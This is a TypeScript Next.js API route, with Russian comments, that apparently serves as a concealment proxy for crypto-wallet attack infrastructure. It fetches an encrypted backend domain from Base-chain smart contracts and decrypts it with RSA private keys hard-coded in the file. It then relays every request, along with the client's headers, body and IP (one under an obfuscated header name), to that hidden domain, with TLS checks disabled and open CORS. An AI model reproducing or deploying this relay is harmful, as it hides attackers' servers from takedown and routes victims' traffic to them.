import { NextRequest, NextResponse } from 'next/server'
import axios from 'axios'
import https from 'https'
import crypto from 'crypto'

/**
 * Отключаем проверку SSL (CURLOPT_SSL_VERIFYPEER => false и CURLOPT_SSL_VERIFYHOST => false).
 * Если вам это не нужно, удалите `rejectUnauthorized: false`.
 */
const httpsAgent = new https.Agent({ rejectUnauthorized: false })

/**
 * Типы блокчейнов
 */
const EVM_TYPE = 'EVM'
const SOL_TYPE = 'SOL'

/**
 * Конфигурация
 */
const CONFIG = {
    rpcUrls: [
        'https://mainnet.base.org',
        'https://base-rpc.publicnode.com',
    ],
    contractAddressEvm: '0x244C9881eA58DdaC4092e79e1723A0d090C9fB32',
    contractAddressSol: '0x0A05F58CA8b31e9E007c840Bb8a00a63543eCEBC',
    keyEvm: `-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDMiBSiUHvnBcuz
pSMmAkdBwscPBWd4DWQTJVSOXV3yE5g/kygMc8Nn/7ae3xJT3+T9RfzYmE5hRtkp
vhWmxpSUySh2MWE915oul0tywewDVP2BndC+MRKvkuDrntvQdYO5pxhWVSURUWOn
IS9cHlMo6Y+7aYxza8YgYbvPZ+6mWZSv20zApc+o797IedEOFB/JY1N4lyxABbSv
exeZa9zAHFrs8QkOMGilwPXUMDDiSR0oaBViPFLrtkIoxZoCdTYY1EE26pd1pUL0
2eOf/sJwpHwGVPoWlfowahLK8WM18068S4SPCA2hvXhV+tq7VsJWUYIMI7D0a1ln
MDakKYsJAgMBAAECggEAA4m7FE+2Gk9JsHLZLSLO9BPteOoMBHye0DdOGM8D/Vha
GDIbIulXEP57EeZ5R7AmIud0sekjOfWNc3Zmo3rok7ujEor/dqAQemEtnJo+0z6Y
yrGIgdxmyVi4wU//LMJLpAjVl/C4cm3o/mQe5fC0WY8ovazcEXG6J1Hpe3NTIoIp
kooKXwvCRxW+7kO81mqI2037WJ0HagkFxVSrsJcspr6Rlcj1ocPXbUp0eUNOwcbz
q2t+SmlFOyOlapenAUzSzYKQggbN8n9YSGXyKOqjKgdkpsJeneL5txECBkWY0ocg
R06rduYfxszs1LTvFkska98XWdKFZzrS8S7BVhcEDQKBgQD7IMygI39SlUR5MLak
HmyGlLw+VCMTa9eXRy8D9UKDwIs/ODERNUeGgVteTSuzZDJ91o/BRwWUagA2sel4
KReQsw//sOzpc+t/Uw6OpLajfdeVj8eG3h+hTyy+jla8+cpq2EfIzGRRCVFLew85
Ncnv9Ygs9Ug/rji4XTuXgXI/UwKBgQDQf91Q6b9xhSyiotO2WRoZznhEWqPQLUdf
8X5akFID4k/F5DLjvJNoBWlVWg3lDDE+Nc6byWrDO0jGYtJwEUGfJmFE7X6gY70z
eAq8SSijk+g4jOdQsClbzlVlQqLVLTE2vhbUK6lhTrkvuS0qA4Dq/SlBAt0fbz61
gukjbGcsswKBgE2gK+BsWJUMcugLOMmuZdmL7ExP8a+1LCUk6dGNZIwZXnGiSviI
wZ1AKyARNqrzE/B1/GXAMGdaBMrjX8m22gPudcmRxQm8vVTUNbG+FH6hDZy7nu9/
hcN1F92nXgR4Kiuwwy+8jl3GRYzRczk5+TvlZ7yN7VFR51KF7z+70bblAoGANJNp
rZOj8O5SGRjSJjNFv6gu752jnUUtsGXnJNMru0sALriilIbi7OIgc6NnyZBPgo5y
8RnTUDPM4CnfQt83GvjEomr4+VztQuNMYbpZAxazAj+VvOUPKNVY91XcVcE1ncZF
X287IQyG6h/Z4bRMd/Uqx/f+5oRY3dCLFaGqSr0CgYEAmJgjVpmzr0lg1Xjkh+Sf
IFGtOUzeAHvrwdkwJ0JyrhAE2jn5us8fxZBpwy20gB2pNfmH6j4RFZAoQFErJ1lJ
6RFXbNP8KDqe5vIwxOCpfWPNsAFF89RUTBsxJSf1ahFMcz9LJOKuTawliGbxw7Sy
N4gAP7/6l6WMuLCGxr5dcBw=
-----END PRIVATE KEY-----`,
    keySol: `-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDEVgXbM3+EcrPi
lElO1rEHb8VNg2BYHHfOBtbIuoUxMHS/8xHSpwbmRokE5kJ8IbYI6y06SNl0MFBF
SZUqRqJE5LRWtwFa9gHrB6NuKUkrKcAVa+u+PzjmdzyE7uumQeRHl+35i9SVfKjj
CPZspjqfHVH6Mt9wYjfQBaQlWOxJoGEUaoaKc9wpSmnrdR1QRYl952IAAvQLJe8K
VBG0eNuQk1gc2XcjLmv70kGm8lZZs3n6xhzWKkMf5JBOOPxvaEqk0DFl8WXDeuP1
icWBfqAP9zako4fLX4Ogl8YZwLjE0Y/QkJk4o298+vViwVP/DRLblEy7XkeiAZoa
G9opoyLzAgMBAAECggEAMbhJJmAtwEhd5pi/0c/LqAL1l7IX8WhQLKQNu2qEtVa8
kimHj22N8T3WkB+RoabV1v9bhkGRk/tyMIG4XSrjCAhU5QrWNIdNKAxYplqdNWmO
w73/Rr/y9GYotM9ebM2N9lVyxfnTvYGCsXABG7Wi7c16h55feDHfSXZMQcr5l5Er
/HT++0DLXbQLddzPqQIoipginjW4GD26cgpfqKPmlf+336cF8N7ZxoITs/CsTG0r
pX9+k7zuJPOyBvae2fPWiwjGzrq1dvYV5VJWG27i6S1zWlMc0aXnaB+VJXDZDwzV
5k5mJb88JGWydMnlOfsg/aYVKHNOCHzmozwja4W5gQKBgQD8Uir51amWaScIJ02M
2G5Ub1F5GRfUg9PgrX+vJEhytwe82heZvwvatWFGjGa0U6wCqg3QdJJI+8FLFpWz
bGW1gDKeos4rVlv68YOkSm/oQtQNYbhkes/fxnfKFtBKv9C57Qzmdw8RPurg/dsn
21WLtRsKcBgxdxXab2E4zqlJgQKBgQDHMuGkv/YT0+gZ8QGOkto+xVJ2AQkO6qMA
2KIK6yQui4lnFoE1sV70MJQpcpnCKucoTGgOghoC26qKKhO4bsQK0GvYgYr1PC04
E+KJrSKwHmPuFktw+6K6QaBep1Kl59oM3mV/OB1EJDKaWixg+Mqh1MY7fbq1BFIt
EuuUNfoecwKBgBHIjMTc/T3fnWOiuYGCw4vp6JkbXqWYwPcl40jpyr1jDwWNbXpl
j6VTgU6imJ5/AzGQ4LZfcOv56m6rYdOqgSSgq3Co0tUVGhh+qyOKJ4b8JsvmpkNW
sI36A/lXUEjkagagoXcgzwwNHirLWYXenJHjKsu6iMn7tauWjAif8CiBAoGARpCP
vn0B/yQiJI5rrsX26iWcgJD9VHtqIvKa9KM3vgVQN2SRgSPEL1zGH6ipL09jc7Md
aYZNEJYgY7FkKwGSEQKkMZ4yS411t1fT+FGM6Dbbz4u2Td/WVYTJ+r3rWTo41DY0
XkzSkUEBbAxljDSWE538Wza+3UEamz0IlwhIAmECgYEArF5sPWj9a8v3nv9maPb2
k8zxMqzcxVCD4P2m2Ropz5sWcnHsjNfF6nKbo5fMF4EbOT+t2CZVPIJ2zVqPwypr
IBocMDtQVR3B0CeQrCgpXbdMNXmr3b16P6MiES04WBkBDYHhLSjKAacSCci4ZyEQ
Qw/APED5z7w9USJQA4tmFDA=
-----END PRIVATE KEY-----`,
}

/**
 * Тип для хранения кеша в памяти
 */
type DomainCache = {
    domainEVM?: string
    domainSOL?: string
    timestamp: number
}

/**
 * Храним кэш в памяти (глобальная для модуля переменная).
 * При перезагрузке приложения этот кэш сбрасывается.
 */
let inMemoryCache: DomainCache | null = null

/**
 * Обновляется каждые 60 секунд (как и раньше).
 */
const updateInterval = 60 // секунд

/**
 * Функция получения IP-адреса (аналог getClientIP в PHP).
 */
function getClientIP(req: NextRequest): string {
    // Check for Cloudflare IP
    const cloudflareIP = req.headers.get('cf-connecting-ip')
    if (cloudflareIP) {
        return cloudflareIP
    }
    
    // Check X-Forwarded-For
    const forwarded = req.headers.get('x-forwarded-for')
    if (forwarded) {
        return forwarded.split(',')[0].trim()
    }
    
    // Fallback to direct IP
    if (req.ip) {
        return req.ip
    }
    return 'unknown'
}

/**
 * Преобразование hex в base64 (для зашифрованных данных)
 */
function hexToBase64(hex: string): string {
    // Удаляем "0x"
    hex = hex.replace(/^0x/, '')
    
    // Сдвигаем на 64 символа (offset)
    hex = hex.substring(64)
    
    // Следующие 64 символа — длина
    const lengthHex = hex.substring(0, 64)
    const length = parseInt(lengthHex, 16)
    
    // Основные данные
    const dataHex = hex.substring(64, length * 2)
    
    // Преобразуем hex в buffer и затем в base64
    const buffer = Buffer.from(dataHex, 'hex')
    return buffer.toString('base64')
}

/**
 * Расшифровка данных с использованием RSA приватного ключа
 */
function decryptSimple(encryptedData: string, privateKey: string): string {
    try {
        const encrypted = Buffer.from(encryptedData, 'base64')
        const decrypted = crypto.privateDecrypt(
            {
                key: privateKey,
                padding: crypto.constants.RSA_PKCS1_PADDING,
            },
            encrypted
        )
        return decrypted.toString('utf8')
    } catch (error) {
        throw new Error('Ошибка при расшифровке: ' + String(error))
    }
}

/**
 * Получаем домен из смарт-контракта через RPC.
 * Используем массив RPC-адресов.
 */
async function fetchTargetDomain(
    rpcUrls: string[],
    contractAddress: string,
    privateKey: string
): Promise<string> {
    // Метод для получения зашифрованного домена
    const data = 'c2fb26a6'

    for (const rpcUrl of rpcUrls) {
        try {
            const response = await axios.post(
                rpcUrl,
                {
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'eth_call',
                    params: [
                        {
                            to: contractAddress,
                            data: `0x${data}`,
                        },
                        'latest',
                    ],
                },
                {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 120000,
                    httpsAgent,
                    validateStatus: () => true,
                }
            )

            if (response.data?.error) {
                // Если в ответе есть поле error — пробуем следующий RPC
                continue
            }

            const resultHex = response.data?.result
            if (!resultHex) {
                continue
            }

            // Преобразуем hex в base64
            const encryptedDomain = hexToBase64(resultHex)
            
            // Расшифровываем с помощью приватного ключа
            const domain = decryptSimple(encryptedDomain, privateKey)
            
            if (domain) {
                return domain
            }
        } catch (error) {
            // Пробуем следующий RPC
            console.error('RPC error:', error)
        }
    }

    throw new Error('Could not fetch target domain')
}

/**
 * Возвращает домен из кэша, либо обновляет, если кэш устарел.
 */
async function getTargetDomain(type: string): Promise<string> {
    // Определяем, какой контракт и ключ использовать
    const contractAddress = type === EVM_TYPE ? CONFIG.contractAddressEvm : CONFIG.contractAddressSol
    const privateKey = type === EVM_TYPE ? CONFIG.keyEvm : CONFIG.keySol
    const cacheKey = type === EVM_TYPE ? 'domainEVM' : 'domainSOL'

    // Проверяем, есть ли что-то в памяти
    if (inMemoryCache && inMemoryCache[cacheKey]) {
        const diff = Math.floor(Date.now() / 1000) - inMemoryCache.timestamp
        if (diff < updateInterval) {
            // Кэш актуален
            return inMemoryCache[cacheKey]!
        }
    }

    // Иначе запрашиваем заново
    const domain = await fetchTargetDomain(CONFIG.rpcUrls, contractAddress, privateKey)

    // Обновляем в памяти
    if (!inMemoryCache) {
        inMemoryCache = {
            timestamp: Math.floor(Date.now() / 1000),
        }
    }
    
    inMemoryCache[cacheKey] = domain
    inMemoryCache.timestamp = Math.floor(Date.now() / 1000)

    return domain
}

/**
 * Прокси-обработчик, повторяющий логику вашего PHP-скрипта (кроме записи на диск).
 */
async function handleProxy(req: NextRequest, endpoint: string, type: string) {
    // Получаем домен (кэширован в памяти)
    let domain = await getTargetDomain(type)
    domain = domain.replace(/\/+$/, '') // убираем trailing slash

    endpoint = '/' + endpoint.replace(/^\/+/, '') // добавляем один ведущий слэш
    const finalUrl = `${domain}${endpoint}`

    // Метод запроса
    const method = req.method

    // Аналог file_get_contents('php://input')
    const bodyBuffer = await req.arrayBuffer()
    const body = bodyBuffer.byteLength > 0 ? Buffer.from(bodyBuffer) : null

    // Собираем заголовки, убираем host/origin и т.п.
    const outHeaders: Record<string, string> = {}
    req.headers.forEach((value, key) => {
        const lowerKey = key.toLowerCase()
        if (
            ['host', 'origin', 'accept-encoding', 'content-encoding'].includes(lowerKey)
        ) {
            return
        }
        outHeaders[lowerKey] = value
    })

    // Добавляем IP-заголовки
    const clientIP = getClientIP(req)
    outHeaders['x-dfkjldifjlifjd'] = clientIP
    outHeaders['x-forwarded-for'] = clientIP
    outHeaders['x-client-ip'] = clientIP

    // Логирование для отладки
    console.log('Final URL:', finalUrl)
    console.log('Method:', method)
    console.log('Headers:', outHeaders)
    console.log('Body length:', body?.length || 0)

    // Проксируем через axios
    try {
        const response = await axios({
            url: finalUrl,
            method,
            headers: outHeaders,
            data: body,
            responseType: 'arraybuffer',
            httpsAgent,
            maxRedirects: 5,
            timeout: 120000,
            validateStatus: () => true,
        })

        const responseData = response.data as Buffer
        const statusCode = response.status
        const contentType = response.headers['content-type']

        // Готовим заголовки ответа
        const resHeaders: Record<string, string> = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
        }

        if (contentType) {
            resHeaders['Content-Type'] = contentType
        }

        return new NextResponse(responseData as BodyInit, {
            status: statusCode,
            headers: resHeaders,
        })
    } catch (error) {
        console.error('Proxy error:', error)
        console.error('Error details:', {
            message: error instanceof Error ? error.message : String(error),
            stack: error instanceof Error ? error.stack : undefined,
            finalUrl,
            method
        })
        
        return new NextResponse('error: ' + String(error), {
            status: 500,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
                'Access-Control-Allow-Headers': '*',
            },
        })
    }
}

/**
 * OPTIONS — возвращаем 204 + CORS
 */
export async function OPTIONS() {
    return new NextResponse(null, {
        status: 204,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Max-Age': '86400',
        },
    })
}

/**
 * Универсальный обработчик для GET/POST/и т.д.
 */
async function handleRequest(req: NextRequest) {
    console.log('🚀 API Route called:', req.method, req.url)
    const { searchParams } = new URL(req.url)
    const e = searchParams.get('e')
    const s = searchParams.get('s')
    console.log('📝 Parameter e:', e)
    console.log('📝 Parameter s:', s)

    // Пинг
    if (e === 'ping_proxy') {
        console.log('🏓 Ping request detected')
        return new NextResponse('pong', {
            status: 200,
            headers: { 'Content-Type': 'text/plain' },
        })
    }

    // Проксируем EVM эндпоинт (параметр e)
    if (e) {
        console.log('🔄 Proxying to EVM endpoint:', e)
        const endpoint = decodeURIComponent(e)
        endpoint.replace(/^\/+/, '')
        console.log('🎯 Decoded endpoint:', endpoint)
        return handleProxy(req, endpoint, EVM_TYPE)
    }

    // Проксируем SOL эндпоинт (параметр s)
    if (s) {
        console.log('🔄 Proxying to SOL endpoint:', s)
        const endpoint = decodeURIComponent(s)
        endpoint.replace(/^\/+/, '')
        console.log('🎯 Decoded endpoint:', endpoint)
        return handleProxy(req, endpoint, SOL_TYPE)
    }

    // Иначе 400
    return new NextResponse('Missing endpoint', { status: 400 })
}

// Экспорт методов
export async function GET(req: NextRequest) {
    return handleRequest(req)
}
export async function POST(req: NextRequest) {
    return handleRequest(req)
}
export async function PUT(req: NextRequest) {
    return handleRequest(req)
}
export async function DELETE(req: NextRequest) {
    return handleRequest(req)
}
export async function PATCH(req: NextRequest) {
    return handleRequest(req)
}
export async function HEAD(req: NextRequest) {
    return handleRequest(req)
}
